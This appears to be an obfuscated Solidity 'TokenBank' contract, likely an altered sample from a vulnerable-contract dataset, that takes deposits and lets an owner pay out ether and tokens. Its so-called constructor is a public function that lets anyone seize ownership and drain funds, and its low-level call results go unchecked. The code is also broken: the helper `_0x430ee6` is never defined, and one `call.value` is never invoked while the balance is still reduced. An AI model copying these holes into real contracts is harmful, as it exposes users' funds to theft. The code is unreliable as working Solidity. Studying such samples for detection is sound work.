// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Ownable
{
    address _0x380da3;
    address _0x388fbf = msg.sender;

    function _0x41cf2a(address _0xb47923)
    public
    _0x2fe8c4
    {
        _0x380da3 = _0xb47923;
    }

    function _0xd1e90d()
    public
    {
        if(msg.sender==_0x380da3)
        {
            _0x388fbf=_0x380da3;
        }
    }

    modifier _0x2fe8c4
    {
        if(_0x388fbf == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x388fbf = msg.sender;
    function WithdrawToken(address _0xbe77e5, uint256 _0x6543d4,address _0xadae7d)
    public
    _0x2fe8c4
    {
        _0xbe77e5.call(bytes4(_0x430ee6("transfer(address,uint256)")),_0xadae7d,_0x6543d4);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x945d0e()
    public
    {
        _0x388fbf = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0x921e17,address _0xfe2bcb,uint _0x83db95)
    public
    _0x2fe8c4
    {
        if(Holders[_0x921e17]>0)
        {
            Holders[_0x921e17]=0;
            WithdrawToken(_0xfe2bcb,_0x83db95,_0x921e17);
        }
    }

    function WithdrawToHolder(address _0xd795be, uint _0x6e9128)
    public
    _0x2fe8c4
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_0xd795be]>=_0x6e9128)
            {
                _0xd795be.call.value(_0x6e9128);
                Holders[_0xd795be]-=_0x6e9128;
            }
        }
    }

}